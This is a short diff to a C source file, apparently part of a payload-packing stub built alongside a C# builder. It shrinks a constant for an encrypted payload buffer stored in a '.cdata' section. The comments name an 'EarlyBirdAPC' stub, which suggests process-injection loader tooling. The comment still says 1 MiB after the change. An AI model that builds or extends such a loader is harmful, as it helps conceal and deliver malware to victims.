@@ -34,7 +34,7 @@
 
 /* Capacidad máxima del buffer embebido en .cdata para la primera mitad del ciphertext (1 MiB).
    Debe coincidir con HALF1_MAX en StubBuilder.cs del builder C#. */
-#define HALF1_MAX 0x100000
+#define HALF1_MAX 0x7D000
 
 /* Layout de los metadatos que el builder escribe en .cdata.
    Idéntico al de stub_EarlyBirdAPC.c — el builder C# es agnóstico al tipo de stub. */
